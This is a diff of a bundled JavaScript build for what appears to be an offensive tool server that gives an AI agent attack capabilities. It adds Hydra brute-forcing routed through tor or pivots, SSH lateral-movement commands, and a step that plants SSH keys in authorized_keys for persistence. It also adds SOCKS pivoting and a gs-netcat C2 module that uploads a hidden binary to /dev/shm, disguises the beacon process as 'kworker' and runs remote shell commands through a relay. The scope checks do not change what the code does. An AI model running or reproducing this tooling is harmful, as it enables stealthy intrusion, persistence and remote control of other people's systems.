     service: external_exports.string().describe("Service: ssh, ftp, rdp, vnc, mysql, postgres, telnet, smb, http-get, etc."),
     user: external_exports.string().describe("Username (or -L file via userFile)"),
     passlist: external_exports.string().describe("Path to password wordlist"),
-    port: external_exports.number().optional().describe("Non-default port")
-  }, async ({ host, service, user, passlist, port }) => {
+    port: external_exports.number().optional().describe("Non-default port"),
+    via: external_exports.string().optional().describe("Tunnel id from tunnel_socks_start \u2014 route the attack through that foothold via proxychains. Omit for direct."),
+    tor: external_exports.boolean().optional().describe("true = route through the system tor daemon (COBRA_PROXY, COBRA_ENABLE_PROXY=1). Required for .onion targets. Mutually exclusive with via.")
+  }, async ({ host, service, user, passlist, port, via, tor }) => {
+    assertNotUnroutedOnion(host, tor);
     assertInScope(host);
+    const prefix = resolveExecPrefix({ via, tor });
     const hydra = requireCapability("hydra");
-    const argv = [hydra, "-t4", "-f", "-V", "-l", user, "-P", passlist];
+    const argv = [...prefix, hydra, "-t4", "-f", "-V", "-l", user, "-P", passlist];
     if (port)
       argv.push("-s", String(port));
     argv.push(`${service}://${host}`);
@@ -31725,13 +31989,16 @@ function sessionOutputFile(id) {
   fs2.mkdirSync(CONFIG.lootDir, { recursive: true });
   return path3.join(CONFIG.lootDir, `session-${id}.log`);
 }
-function startSession(kind, desc, argv) {
+function startSession(kind, desc, argv, opts = {}) {
   if (argv.length === 0)
     throw new Error("empty argv for session");
   const id = `${kind}-${Date.now().toString(36)}-${Math.floor(Math.random() * 1e4)}`;
   const outputFile = sessionOutputFile(id);
   const out = fs2.createWriteStream(outputFile, { flags: "a" });
-  const child = spawn2(argv[0], argv.slice(1), { stdio: ["ignore", "pipe", "pipe"] });
+  const child = spawn2(argv[0], argv.slice(1), {
+    stdio: ["ignore", "pipe", "pipe"],
+    env: opts.env ? { ...process.env, ...opts.env } : process.env
+  });
   child.stdout.on("data", (d) => out.write(d));
   child.stderr.on("data", (d) => out.write(d));
   child.on("close", () => out.end());
@@ -31745,6 +32012,22 @@ function startSession(kind, desc, argv) {
   };
   procs.set(id, child);
   registerSession(info);
+  return info;
+}
+async function startSessionChecked(kind, desc, argv, graceMs = 2e3, opts = {}) {
+  const info = startSession(kind, desc, argv, opts);
+  await new Promise((r) => setTimeout(r, graceMs));
+  const child = procs.get(info.id);
+  if (!child || child.exitCode !== null) {
+    stopSession(info.id);
+    let tail = "";
+    try {
+      tail = fs2.readFileSync(info.outputFile, "utf8").trim().split("\n").slice(-5).join("\n");
+    } catch {
+    }
+    throw new Error(`session ${info.id} died on startup (see ${info.outputFile})${tail ? `:
+${tail}` : "."}`);
+  }
   return info;
 }
 function sessionOutput(id, tailLines = 50) {
@@ -31850,9 +32133,7 @@ function registerCaptureTools(server) {
     filter: external_exports.string().optional().describe("BPF filter, e.g. 'tcp port 80'")
   }, async ({ iface, filter }) => {
     const tcpdump = requireCapability("tcpdump");
-    const argv = [tcpdump, "-i", iface, "-nn", "-q"];
-    if (filter)
-      argv.push(filter);
+    const argv = [tcpdump, "-i", iface, "-nn", "-q", ...filter ? [filter] : []];
     const info = startSession("sniff", `tcpdump -i ${iface} ${filter ?? ""}`, argv);
     return text7(`\u{1F50D} Sniffer started \u2014 session ${info.id}
   output: ${info.outputFile}`);
@@ -31892,10 +32173,748 @@ function registerCaptureTools(server) {
   server.tool("listen_stop", "Stop a listener session by ID.", { id: external_exports.string() }, async ({ id }) => text7(stopSession(id) ? `\u{1F6D1} Listener ${id} stopped.` : `No such session: ${id}`));
 }
 
-// build/tools/brain.js
+// build/tools/lateral.js
 import fs3 from "node:fs";
 import path5 from "node:path";
+import { execFile as execFile2 } from "node:child_process";
+import { promisify as promisify2 } from "node:util";
+var execFileP2 = promisify2(execFile2);
 function text8(s) {
+  return { content: [{ type: "text", text: s }] };
+}
+var SSH_OPTS = [
+  "-o",
+  "UserKnownHostsFile=/dev/null",
+  "-o",
+  "StrictHostKeyChecking=accept-new",
+  "-o",
+  "ConnectTimeout=10",
+  "-o",
+  "BatchMode=yes"
+];
+function buildSshArgv(a, extra, remoteCmd) {
+  if (!a.password && !a.key_path) {
+    throw new Error("auth required: pass `password` or `key_path`.");
+  }
+  const argv = [];
+  if (a.password)
+    argv.push(requireCapability("sshpass"), "-e");
+  argv.push(requireCapability("ssh"), ...SSH_OPTS);
+  if (a.key_path)
+    argv.push("-i", a.key_path);
+  if (a.port)
+    argv.push("-p", String(a.port));
+  argv.push(...extra, `${a.user}@${a.host}`);
+  if (remoteCmd !== void 0)
+    argv.push(remoteCmd);
+  return argv;
+}
+function registerLateralTools(server) {
+  server.tool("exec_ssh", "Run a command on an authorized host over SSH (password or key). Lateral movement primitive: act on the next machine with creds from creds_brute/loot. Output to loot file.", {
+    host: external_exports.string().describe("Target host (must be in COBRA_ALLOWED_SCOPE)"),
+    user: external_exports.string().describe("Username"),
+    password: external_exports.string().optional().describe("Password (SSHPASS env, never logged)"),
+    key_path: external_exports.string().optional().describe("Private key path (e.g. from ssh_key_setup)"),
+    port: external_exports.number().optional().describe("SSH port (default 22)"),
+    command: external_exports.string().describe("Remote command, e.g. 'id; uname -a; cat /etc/passwd'")
+  }, async ({ host, user, password, key_path, port, command }) => {
+    assertInScope(host);
+    const argv = buildSshArgv({ host, user, password, key_path, port }, ["-T"], command);
+    const env = password ? { SSHPASS: password } : void 0;
+    const r = await runToLoot("exec_ssh", argv, { env, timeoutMs: 10 * 60 * 1e3, maxLines: 30 });
+    return text8(resultText(`exec_ssh ${user}@${host}`, r));
+  });
+  server.tool("ssh_key_setup", "Generate an engagement keypair (in the loot dir) and install the pubkey on the target with a looted password. Then use exec_ssh/tunnel_socks_start with key_path \u2014 password-free.", {
+    host: external_exports.string().describe("Target host (in scope)"),
+    user: external_exports.string().describe("Username"),
+    password: external_exports.string().describe("Looted password for the initial install"),
+    port: external_exports.number().optional().describe("SSH port (default 22)")
+  }, async ({ host, user, password, port }) => {
+    assertInScope(host);
+    const sshpass = requireCapability("sshpass");
+    const ssh = requireCapability("ssh");
+    const sshKeygen = requireCapability("ssh-keygen");
+    fs3.mkdirSync(path5.join(CONFIG.lootDir, "keys"), { recursive: true });
+    const keyPath = path5.join(CONFIG.lootDir, "keys", `cobra-${user}-${host.replace(/[^a-zA-Z0-9.-]/g, "_")}`);
+    if (!fs3.existsSync(keyPath)) {
+      await execFileP2(sshKeygen, ["-q", "-t", "ed25519", "-N", "", "-f", keyPath, "-C", `cobra-${user}@${host}`]);
+    }
+    const pub = fs3.readFileSync(`${keyPath}.pub`, "utf8").trim();
+    const installCmd = `mkdir -p ~/.ssh && chmod 700 ~/.ssh && grep -qF '${pub}' ~/.ssh/authorized_keys 2>/dev/null || echo '${pub}' >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys; echo KEY_INSTALLED`;
+    const argv = [
+      sshpass,
+      "-e",
+      ssh,
+      ...SSH_OPTS,
+      ...port ? ["-p", String(port)] : [],
+      "-T",
+      `${user}@${host}`,
+      installCmd
+    ];
+    const r = await runToLoot("ssh_key_setup", argv, { env: { SSHPASS: password }, timeoutMs: 60 * 1e3 });
+    const ok = r.exitCode === 0 && fs3.readFileSync(r.lootFile, "utf8").includes("KEY_INSTALLED");
+    return text8(`${resultText("ssh_key_setup", r)}
+
+` + (ok ? `\u{1F511} Key installed. Use key_path: ${keyPath}` : `\u26A0\uFE0F Key install may have failed (exit ${r.exitCode}) \u2014 check the loot file.`));
+  });
+  server.tool("tunnel_socks_start", "Open a SOCKS5 proxy through a foothold (ssh -D). Session-managed; returns a tunnel id usable as `via` on recon/web/creds tools. Requires COBRA_ENABLE_TUNNELS=1.", {
+    host: external_exports.string().describe("Foothold host (in scope)"),
+    user: external_exports.string().describe("Username"),
+    password: external_exports.string().optional().describe("Password (SSHPASS env, never logged)"),
+    key_path: external_exports.string().optional().describe("Private key path (e.g. from ssh_key_setup)"),
+    port: external_exports.number().optional().describe("SSH port (default 22)"),
+    local_port: external_exports.number().optional().describe("Local SOCKS port (default 1080)")
+  }, async ({ host, user, password, key_path, port, local_port }) => {
+    if (!CONFIG.enableTunnels) {
+      return text8("\u274C Tunnels disabled. Set COBRA_ENABLE_TUNNELS=1 on the server (the cobra-ops xint equivalent) and restart.");
+    }
+    assertInScope(host);
+    const lport = local_port ?? 1080;
+    const argv = buildSshArgv({ host, user, password, key_path, port }, ["-N", "-T", "-D", `127.0.0.1:${lport}`, "-o", "ExitOnForwardFailure=yes", "-o", "ServerAliveInterval=30"]);
+    const env = password ? { SSHPASS: password } : void 0;
+    const info = await startSessionChecked("tunnel", `ssh -D 127.0.0.1:${lport} ${user}@${host} (SOCKS5)`, argv, 2500, { env });
+    registerTunnel({ id: info.id, port: lport, socksVersion: 5, via: `${user}@${host}` });
+    return text8(`\u{1F573}\uFE0F  SOCKS5 tunnel up \u2014 tunnel id ${info.id}
+  socks5://127.0.0.1:${lport} \u2192 via ${user}@${host}
+  Use via="${info.id}" on recon/web/creds tools to route through it.
+  log: ${info.outputFile}`);
+  });
+  server.tool("tunnel_list", "List active SOCKS tunnels (id, local port, foothold).", {}, async () => {
+    const ts = listTunnels();
+    if (ts.length === 0)
+      return text8("No active tunnels. Start one with tunnel_socks_start.");
+    const rows = ts.map((t) => `- ${t.id}  socks${t.socksVersion}://127.0.0.1:${t.port}  via ${t.via}`);
+    return text8(`## Active tunnels (${ts.length})
+
+` + rows.join("\n"));
+  });
+  server.tool("tunnel_stop", "Stop a SOCKS tunnel by id (kills the ssh process and removes the route).", { id: external_exports.string().describe("Tunnel id from tunnel_socks_start / tunnel_list") }, async ({ id }) => {
+    removeTunnel(id);
+    return text8(stopSession(id) ? `\u{1F6D1} Tunnel ${id} stopped.` : `No such tunnel: ${id}`);
+  });
+}
+
+// build/tools/c2.js
+import fs4 from "node:fs";
+import path6 from "node:path";
+import net from "node:net";
+import crypto from "node:crypto";
+import { spawn as spawn3, execFile as execFile3 } from "node:child_process";
+import { promisify as promisify3 } from "node:util";
+var execFileP3 = promisify3(execFile3);
+function text9(s) {
+  return { content: [{ type: "text", text: s }] };
+}
+var REMOTE_BIN = "/dev/shm/.gsnc";
+var SECRET_RE = /^[A-Za-z0-9_-]{8,128}$/;
+var MASQ_RE = /^[A-Za-z0-9_.-]{1,32}$/;
+var MODE_FLAGS = {
+  shell: "-l -e /bin/bash -q -D",
+  socks: "-l -S -q -D",
+  login: "-l -i -q -D"
+};
+function assertGsReady() {
+  if (!CONFIG.enableTunnels) {
+    throw new Error("RELAY C2 DISABLED: set COBRA_ENABLE_TUNNELS=1 on the server (the cobra-ops xint equivalent) and restart.");
+  }
+  const relay = process.env.GS_HOST?.trim();
+  if (!relay) {
+    if (!CONFIG.allowInternet) {
+      throw new Error("EGRESS DENIED: GS_HOST is unset, so beacons ride the PUBLIC GSRN \u2014 internet egress. Set COBRA_ALLOW_INTERNET=1, or export GS_HOST/GS_PORT for your own relay (in scope = no internet gate).");
+    }
+  } else if (!inScope(relay) && !CONFIG.allowInternet) {
+    throw new Error(`EGRESS DENIED: GS_HOST="${relay}" is outside COBRA_ALLOWED_SCOPE \u2014 internet egress. Set COBRA_ALLOW_INTERNET=1, or use a relay inside scope.`);
+  }
+}
+function relayDesc() {
+  const h = process.env.GS_HOST?.trim();
+  return h ? `relay ${h}:${process.env.GS_PORT?.trim() || "7350"}` : "public GSRN";
+}
+function secretLabel(secret) {
+  return `${secret.slice(0, 4)}\u2026`;
+}
+async function genSecret() {
+  const p = capabilityPath("gs-netcat");
+  if (p) {
+    try {
+      const { stdout } = await execFileP3(p, ["-g"], { timeout: 15e3 });
+      const s = stdout.trim().split(/\s+/).pop() ?? "";
+      if (/^[A-Za-z0-9]{12,}$/.test(s))
+        return s;
+    } catch {
+    }
+  }
+  const abc = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  const buf = crypto.randomBytes(24);
+  return [...buf].map((b) => abc[b % abc.length]).join("");
+}
+function writeKeyFile(secret) {
+  const dir = path6.join(CONFIG.lootDir, "keys");
+  fs4.mkdirSync(dir, { recursive: true, mode: 448 });
+  const f = path6.join(dir, `gs-${Date.now().toString(36)}-${crypto.randomBytes(3).toString("hex")}.key`);
+  fs4.writeFileSync(f, secret, { mode: 384 });
+  return f;
+}
+function resolveSecret(secret, beacon) {
+  if (beacon) {
+    const b = getBeacon(beacon);
+    if (!b)
+      throw new Error(`no such beacon: ${beacon} \u2014 check c2_gs_list.`);
+    return { keyFile: b.keyFile, label: b.label, beacon: b };
+  }
+  if (!secret) {
+    throw new Error("auth required: pass `secret` or `beacon` (id from c2_gs_deploy).");
+  }
+  if (!SECRET_RE.test(secret)) {
+    throw new Error("secret must be 8-128 chars of [A-Za-z0-9_-] (shell-safe; gs-netcat -g output qualifies).");
+  }
+  return { keyFile: writeKeyFile(secret), label: secretLabel(secret) };
+}
+async function preflight(keyFile, timeoutMs = 15e3) {
+  const gsnc = requireCapability("gs-netcat");
+  try {
+    const { stdout, stderr } = await execFileP3(gsnc, ["-k", keyFile, "-t"], {
+      timeout: timeoutMs
+    });
+    return { alive: true, detail: (stdout + stderr).trim() };
+  } catch (e) {
+    const detail = [e?.stdout, e?.stderr, e?.message].filter(Boolean).join("\n").trim().split("\n").slice(-4).join("\n");
+    return { alive: false, detail: detail || "peer not listening / relay unreachable" };
+  }
+}
+function tryConnect(port, timeoutMs = 800) {
+  return new Promise((resolve) => {
+    const sock = net.connect({ host: "127.0.0.1", port });
+    const done = (ok) => {
+      sock.destroy();
+      resolve(ok);
+    };
+    sock.once("connect", () => done(true));
+    sock.once("error", () => done(false));
+    sock.setTimeout(timeoutMs, () => done(false));
+  });
+}
+async function waitForPort(port, timeoutMs) {
+  const deadline = Date.now() + timeoutMs;
+  while (Date.now() < deadline) {
+    if (await tryConnect(port))
+      return true;
+    await new Promise((r) => setTimeout(r, 400));
+  }
+  return false;
+}
+var GS_MARK = "__COBRA_GS_RC__";
+function cleanGsOutput(raw) {
+  let s = raw.replace(/\x1b\[[0-9;?]*[A-Za-z]/g, "").replace(/\x1b\][^\x07]*(\x07|\x1b\\)/g, "").replace(/\r/g, "");
+  const idx = s.search(new RegExp(`^.*${GS_MARK}:\\d+.*$`, "m"));
+  if (idx >= 0)
+    s = s.slice(0, idx);
+  return s.split("\n").filter((l) => !l.includes(`echo ${GS_MARK}`)).join("\n").replace(/\n?exit\s*$/, "").trim();
+}
+function runGsShell(keyFile, command, timeoutMs, extraEnv = {}) {
+  const gsnc = requireCapability("gs-netcat");
+  fs4.mkdirSync(CONFIG.lootDir, { recursive: true });
+  const file2 = path6.join(CONFIG.lootDir, `c2_gs_shell-${(/* @__PURE__ */ new Date()).toISOString().replace(/[:.]/g, "-")}.log`);
+  const started = Date.now();
+  return new Promise((resolve, reject) => {
+    const child = spawn3(gsnc, ["-k", keyFile, "-q"], {
+      stdio: ["pipe", "pipe", "pipe"],
+      env: { ...process.env, ...extraEnv }
+    });
+    const out = fs4.createWriteStream(file2, { flags: "a" });
+    let captured = "";
+    let rc = null;
+    let settled = false;
+    const finish = (timedOut) => {
+      if (settled)
+        return;
+      settled = true;
+      clearTimeout(timer);
+      try {
+        child.kill("SIGTERM");
+      } catch {
+      }
+      out.end();
+      resolve({
+        rc,
+        output: cleanGsOutput(captured),
+        lootFile: file2,
+        timedOut,
+        durationMs: Date.now() - started
+      });
+    };
+    const onData = (d) => {
+      out.write(d);
+      if (captured.length < 256 * 1024)
+        captured += d.toString();
+      const m = captured.match(/__COBRA_GS_RC__:(\d+)/);
+      if (m) {
+        rc = Number(m[1]);
+        finish(false);
+      }
+    };
+    child.stdout.on("data", onData);
+    child.stderr.on("data", onData);
+    child.on("error", (err) => {
+      clearTimeout(timer);
+      out.end();
+      reject(new Error(`SPAWN ERROR running gs-netcat: ${err.message}`));
+    });
+    child.on("close", () => finish(false));
+    const timer = setTimeout(() => finish(true), timeoutMs);
+    const sin = child.stdin;
+    sin.write(`${command} 2>&1; echo ${GS_MARK}:$?
+exit
+`, () => sin.end());
+  });
+}
+function gsTorEnv(tor) {
+  if (!tor)
+    return {};
+  if (!CONFIG.enableProxy) {
+    throw new Error(TOR_GATE_OFF);
+  }
+  const m = CONFIG.proxyUrl.match(/^socks5h?:\/\/([^:/]+):(\d+)$/);
+  if (!m) {
+    throw new Error(`COBRA_PROXY must be socks5h://host:port (got "${CONFIG.proxyUrl}") \u2014 gs-netcat -T needs host:port.`);
+  }
+  return { GSOCKET_TOR: `${m[1]}:${m[2]}` };
+}
+async function sshExec(auth, remoteCmd, timeoutMs = 3e4) {
+  const argv = buildSshArgv(auth, ["-T"], remoteCmd);
+  const env = auth.password ? { ...process.env, SSHPASS: auth.password } : process.env;
+  try {
+    const { stdout, stderr } = await execFileP3(argv[0], argv.slice(1), {
+      env,
+      timeout: timeoutMs
+    });
+    return { code: 0, out: (stdout + stderr).trim() };
+  } catch (e) {
+    return {
+      code: typeof e?.code === "number" ? e.code : -1,
+      out: [e?.stdout, e?.stderr, e?.message].filter(Boolean).join("\n").trim()
+    };
+  }
+}
+function sshUpload(auth, localPath) {
+  const b64 = fs4.readFileSync(localPath).toString("base64");
+  const argv = buildSshArgv(auth, ["-T"], `umask 077; base64 -d > ${REMOTE_BIN} && chmod 700 ${REMOTE_BIN} && echo UPLOAD_OK`);
+  const env = auth.password ? { ...process.env, SSHPASS: auth.password } : process.env;
+  return new Promise((resolve, reject) => {
+    const child = spawn3(argv[0], argv.slice(1), { stdio: ["pipe", "pipe", "pipe"], env });
+    let captured = "";
+    const onData = (d) => {
+      if (captured.length < 64 * 1024)
+        captured += d.toString();
+    };
+    child.stdout.on("data", onData);
+    child.stderr.on("data", onData);
+    child.on("error", (err) => reject(new Error(`SPAWN ERROR running ssh: ${err.message}`)));
+    child.on("close", (code) => {
+      const ok = code === 0 && captured.includes("UPLOAD_OK");
+      resolve({ ok, out: captured.trim() });
+    });
+    const sin = child.stdin;
+    const CHUNK = 256 * 1024;
+    let i = 0;
+    const writeNext = () => {
+      while (i < b64.length) {
+        const part = b64.slice(i, i += CHUNK);
+        if (!sin.write(part)) {
+          sin.once("drain", writeNext);
+          return;
+        }
+      }
+      sin.end();
+    };
+    writeNext();
+  });
+}
+function normArch(a) {
+  const s = a.trim().toLowerCase();
+  if (s === "x86_64" || s === "amd64")
+    return "x86_64";
+  if (s === "aarch64" || s === "arm64")
+    return "aarch64";
+  return s;
+}
+function registerC2Tools(server) {
+  server.tool("c2_gs_secret", "Generate a gsocket secret (gs-netcat -g; crypto fallback). Local RNG only \u2014 no network, no gate. Feed the secret to c2_gs_deploy / c2_gs_shell / c2_gs_socks_start.", {}, async () => {
+    const s = await genSecret();
+    return text9(`\u{1F511} gsocket secret: ${s}
+  label: ${secretLabel(s)}  (state/logs only ever show the label)`);
+  });
+  server.tool("c2_gs_deploy", "Mint a gs-netcat beacon: returns target-side one-liner(s), and optionally auto-deploys over SSH (arch check, base64 upload of the local static binary to /dev/shm, daemonized launch, pgrep verify). Modes: shell (-l -e bash \u2192 c2_gs_shell), socks (-l -S \u2192 c2_gs_socks_start), login (-l -i \u2192 human PTY). Scope-checked per hop \u2014 deploy only to authorized hosts.", {
+    mode: external_exports.enum(["shell", "socks", "login"]).optional().describe("Beacon personality (default shell)"),
+    secret: external_exports.string().optional().describe("Reuse an existing secret (else one is generated)"),
+    host: external_exports.string().optional().describe("Foothold host for SSH auto-deploy (in scope). Omit = one-liner only"),
+    user: external_exports.string().optional().describe("SSH user (required with host)"),
+    password: external_exports.string().optional().describe("Password (SSHPASS env, never logged)"),
+    key_path: external_exports.string().optional().describe("Private key path (e.g. from ssh_key_setup)"),
+    port: external_exports.number().optional().describe("SSH port (default 22)"),
+    masq: external_exports.string().optional().describe("Masquerade process name on the target (exec -a), e.g. 'kworker'"),
+    upload: external_exports.boolean().optional().describe("Upload the local static gs-netcat if the target lacks one (default true)")
+  }, async ({ mode, secret, host, user, password, key_path, port, masq, upload }) => {
+    const m = mode ?? "shell";
+    const flags = MODE_FLAGS[m];
+    if (masq && !MASQ_RE.test(masq))
+      throw new Error("masq must be 1-32 chars of [A-Za-z0-9_.-].");
+    const sec = secret ?? await genSecret();
+    if (!SECRET_RE.test(sec)) {
+      throw new Error("secret must be 8-128 chars of [A-Za-z0-9_-] (shell-safe).");
+    }
+    const label = secretLabel(sec);
+    const gsArgs = `-s ${sec} ${flags}`;
+    const plain = `(GSOCKET_ARGS="${gsArgs}" gs-netcat 2>/dev/null &)`;
+    const staged = masq ? `(GSOCKET_ARGS="${gsArgs}" bash -c 'exec -a ${masq} ${REMOTE_BIN}' 2>/dev/null &)` : `(GSOCKET_ARGS="${gsArgs}" ${REMOTE_BIN} 2>/dev/null &)`;
+    let where = "manual one-liner";
+    let cleanup = `pkill -f '${masq ?? "gs-netcat"}'; sleep 1; pkill -f '${masq ?? "gs-netcat"}'`;
+    let deployReport = "";
+    if (host) {
+      if (!user)
+        throw new Error("user is required with host.");
+      assertInScope(host);
+      const auth = { host, user, password, key_path, port };
+      const recon = await sshExec(auth, "uname -m; command -v gs-netcat || true");
+      if (recon.code !== 0)
+        throw new Error(`ssh recon failed (exit ${recon.code}):
+${recon.out}`);
+      const [rArchRaw, foundBin] = recon.out.split("\n").map((l) => l.trim());
+      let binCmd = foundBin || "";
+      if (!binCmd) {
+        if (upload === false) {
+          throw new Error("no gs-netcat on target and upload=false \u2014 stage the binary and run the one-liner manually.");
+        }
+        const localGs = requireCapability("gs-netcat");
+        const lArch = normArch((await execFileP3("uname", ["-m"])).stdout);
+        const rArch = normArch(rArchRaw ?? "");
+        if (lArch !== rArch) {
+          throw new Error(`arch mismatch: local gs-netcat is ${lArch}, target is ${rArch}. Fetch the matching static build (gs-netcat_linux-${rArch} \u2014 cobrashell 'bin gs-netcat' / the COBRA .onion) and run the one-liner manually.`);
+        }
+        const up = await sshUpload(auth, localGs);
+        if (!up.ok)
+          throw new Error(`binary upload failed:
+${up.out}`);
+        binCmd = REMOTE_BIN;
+      }
+      const run = masq ? `bash -c 'exec -a ${masq} ${binCmd}'` : binCmd;
+      const pat = masq ?? binCmd;
+      const launch = await sshExec(auth, `GSOCKET_ARGS="${gsArgs}" setsid -f ${run} </dev/null >/dev/null 2>&1; sleep 1; pgrep -f '${pat}' >/dev/null && echo BEACON_OK || echo BEACON_FAIL`);
+      if (!launch.out.includes("BEACON_OK")) {
+        throw new Error(`beacon launch unverified (pgrep found nothing):
+${launch.out}`);
+      }
+      where = `${user}@${host}`;
+      cleanup = `pkill -f '${pat}'; sleep 1; pkill -f '${pat}'` + (binCmd === REMOTE_BIN ? `; rm -f ${REMOTE_BIN}` : "");
+      deployReport = `
+  auto-deploy: ${binCmd === REMOTE_BIN ? `uploaded \u2192 ${REMOTE_BIN}, ` : ""}daemon up (pgrep \u2713)${masq ? ` as '${masq}'` : ""}`;
+    }
+    const keyFile = writeKeyFile(sec);
+    const id = nextSessionId("gsb");
+    registerBeacon({ id, mode: m, where, started: (/* @__PURE__ */ new Date()).toISOString(), label, keyFile, cleanup });
+    let relayCheck = "";
+    try {
+      assertGsReady();
+      const pf = await preflight(keyFile);
+      relayCheck = pf.alive ? "\n  relay check: beacon IS listening \u2713" : `
+  relay check: not answering yet (${pf.detail})`;
+    } catch {
+      relayCheck = "\n  relay check: skipped (operator-side gates off \u2014 c2_gs_shell/socks need COBRA_ENABLE_TUNNELS=1 + the egress rule)";
+    }
+    const drive = m === "socks" ? `  c2_gs_socks_start beacon=${id}  \u2192 then via="<tunnel-id>" on recon/web/creds tools
+` : m === "login" ? `  operator attaches by hand: gs-netcat -k ${keyFile} -i
+` : `  c2_gs_shell beacon=${id} command='id; uname -a'
+`;
+    return text9(`\u{1F41D} gs beacon ready \u2014 ${id}  (mode ${m}, ${where})
+  secret:  ${sec}
+  label:   ${label}   keyfile(0600): ${keyFile}
+  relay:   ${relayDesc()}${deployReport}${relayCheck}
+
+Target-side one-liners (for a manual shell on the target):
+  PATH binary:  ${plain}
+  staged:       ${staged}
+
+Drive it:
+${drive}Cleanup (engagement end \u2014 the -D watchdog needs the double-kill):
+  ${cleanup}`);
+  });
+  server.tool("c2_gs_shell", "Run a non-interactive command on a beacon through the relay (shell-mode beacons). Output \u2192 loot file; summary + exit code returned. Requires COBRA_ENABLE_TUNNELS=1 + the relay egress rule.", {
+    beacon: external_exports.string().optional().describe("Beacon id from c2_gs_deploy (uses its stored keyfile)"),
+    secret: external_exports.string().optional().describe("Ad-hoc secret instead of a beacon id"),
+    command: external_exports.string().describe("Command for the beacon's bash, e.g. 'id; uname -a; ip a'"),
+    timeout: external_exports.number().optional().describe("Seconds to wait for completion (default 45)"),
+    skip_preflight: external_exports.boolean().optional().describe("Skip the -t peer check (default false)"),
+    tor: external_exports.boolean().optional().describe("true = reach the relay through tor (gs-netcat -T, COBRA_ENABLE_PROXY=1)")
+  }, async ({ beacon, secret, command, timeout, skip_preflight, tor }) => {
+    assertGsReady();
+    const torEnv = gsTorEnv(tor);
+    const { keyFile, label, beacon: b } = resolveSecret(secret, beacon);
+    if (b?.mode === "socks") {
+      throw new Error(`beacon ${b.id} is a SOCKS beacon (-l -S) \u2014 it forwards traffic, it doesn't run commands. Use c2_gs_socks_start, or deploy a shell beacon.`);
+    }
+    if (!skip_preflight) {
+      const pf = await preflight(keyFile);
+      if (!pf.alive) {
+        throw new Error(`beacon ${label} not listening on the ${relayDesc()}:
+${pf.detail}
+(redeploy it, or skip_preflight=true to try anyway)`);
+      }
+    }
+    const r = await runGsShell(keyFile, command, (timeout ?? 45) * 1e3, torEnv);
+    const status = r.timedOut ? `TIMED OUT after ${(r.durationMs / 1e3).toFixed(0)}s \u2014 partial output below` : r.rc === null ? "channel closed before the completion marker (beacon died?)" : `exit ${r.rc}`;
+    const lines = r.output.split("\n");
+    const head = lines.slice(0, 30).join("\n");
+    const more = lines.length > 30 ? `
+\u2026 (${lines.length - 30} more lines in loot file)` : "";
+    return text9(`## c2_gs_shell \u2014 ${status} in ${(r.durationMs / 1e3).toFixed(1)}s  [${label} via ${relayDesc()}]
+
+` + (r.output ? head + more : "(no output)") + `
+
+\u{1F4C1} Full output: ${r.lootFile}` + (b?.mode === "login" ? `
+\u26A0\uFE0F login (-i) beacons are PTYs \u2014 expect prompt/echo noise; shell-mode beacons are cleaner for automation.` : ""));
+  });
+  server.tool("c2_gs_socks_start", 'Open a local SOCKS5 listener that pivots through a socks-mode beacon (gs-netcat -p \u2192 beacon -l -S). Registers as a tunnel \u2014 use via="<tunnel-id>" on recon/web/creds tools. Requires COBRA_ENABLE_TUNNELS=1 + the relay egress rule.', {
+    beacon: external_exports.string().optional().describe("Beacon id from c2_gs_deploy (mode socks)"),
+    secret: external_exports.string().optional().describe("Ad-hoc secret instead of a beacon id"),
+    local_port: external_exports.number().optional().describe("Local SOCKS port (default 1080)"),
+    skip_preflight: external_exports.boolean().optional().describe("Skip the -t peer check (default false)"),
+    tor: external_exports.boolean().optional().describe("true = reach the relay through tor (gs-netcat -T, COBRA_ENABLE_PROXY=1)")
+  }, async ({ beacon, secret, local_port, skip_preflight, tor }) => {
+    assertGsReady();
+    const torEnv = gsTorEnv(tor);
+    const { keyFile, label } = resolveSecret(secret, beacon);
+    const lport = local_port ?? 1080;
+    if (await tryConnect(lport)) {
+      throw new Error(`127.0.0.1:${lport} is already in use \u2014 pick another local_port (check session_list / tunnel_list).`);
+    }
+    if (!skip_preflight) {
+      const pf = await preflight(keyFile);
+      if (!pf.alive) {
+        throw new Error(`beacon ${label} not listening on the ${relayDesc()}:
+${pf.detail}
+(redeploy it, or skip_preflight=true to try anyway)`);
+      }
+    }
+    const gsnc = requireCapability("gs-netcat");
+    const info = await startSessionChecked("tunnel", `gs-netcat -p 127.0.0.1:${lport} (SOCKS via gs ${label}${tor ? " over tor" : ""})`, [gsnc, "-q", "-k", keyFile, "-p", String(lport)], 4e3, Object.keys(torEnv).length > 0 ? { env: torEnv } : void 0);
+    if (!await waitForPort(lport, 1e4)) {
+      stopSession(info.id);
+      throw new Error(`gs-netcat stayed up but 127.0.0.1:${lport} never listened \u2014 see ${info.outputFile}`);
+    }
+    registerTunnel({ id: info.id, port: lport, socksVersion: 5, via: `gs ${label}` });
+    return text9(`\u{1F573}\uFE0F  gs SOCKS5 pivot up \u2014 tunnel id ${info.id}
+  socks5://127.0.0.1:${lport} \u2192 beacon ${label} via ${relayDesc()}
+  Use via="${info.id}" on recon/web/creds tools to route through it.
+  log: ${info.outputFile}`);
+  });
+  server.tool("c2_gs_list", "C2 dashboard: registered gs beacons (id, mode, where, label, cleanup) + active tunnels (gs and ssh).", {}, async () => {
+    const bs = listBeacons();
+    const ts = listTunnels();
+    const parts = [];
+    parts.push(`## Beacons (${bs.length})`);
+    parts.push(bs.length ? bs.map((b) => `- ${b.id}  [${b.mode}] ${b.where}  label ${b.label}  up since ${b.started}
+    cleanup: ${b.cleanup}`).join("\n") : "- (none \u2014 c2_gs_deploy first)");
+    parts.push(`
+## Tunnels (${ts.length})`);
+    parts.push(ts.length ? ts.map((t) => `- ${t.id}  socks${t.socksVersion}://127.0.0.1:${t.port}  via ${t.via}`).join("\n") : "- (none \u2014 tunnel_socks_start / c2_gs_socks_start)");
+    parts.push(`
+Relay: ${relayDesc()}  |  gates: tunnels=${CONFIG.enableTunnels ? "on" : "OFF"}, internet=${CONFIG.allowInternet ? "on" : "OFF"}`);
+    return text9(parts.join("\n"));
+  });
+}
+
+// build/tools/shell.js
+import fs5 from "node:fs";
+import path7 from "node:path";
+import { spawn as spawn4 } from "node:child_process";
+function text10(s) {
+  return { content: [{ type: "text", text: s }] };
+}
+var SH_MARK = "__COBRA_SH_RC__";
+var DEFAULT_TIMEOUT_S = 60;
